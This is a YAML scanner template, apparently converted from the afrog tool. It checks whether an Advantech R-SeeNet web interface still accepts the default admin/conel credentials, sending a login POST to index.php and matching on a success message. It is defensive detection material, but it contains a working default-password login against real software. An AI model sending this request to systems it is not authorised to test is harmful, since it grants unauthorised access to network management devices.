# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      page=login_change&oper=0&username=admin&password=conel&submit=Login
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - User is succesfully logged.
          - <title>R-SeeNet
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/index.php'
id: rseenet-default-password
info:
  author: princechaddha
  description: fofa "R-SeeNet"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Advantech R-SeeNet Default Login
  severity: high
  tags: rseenet,default-password,argus-import
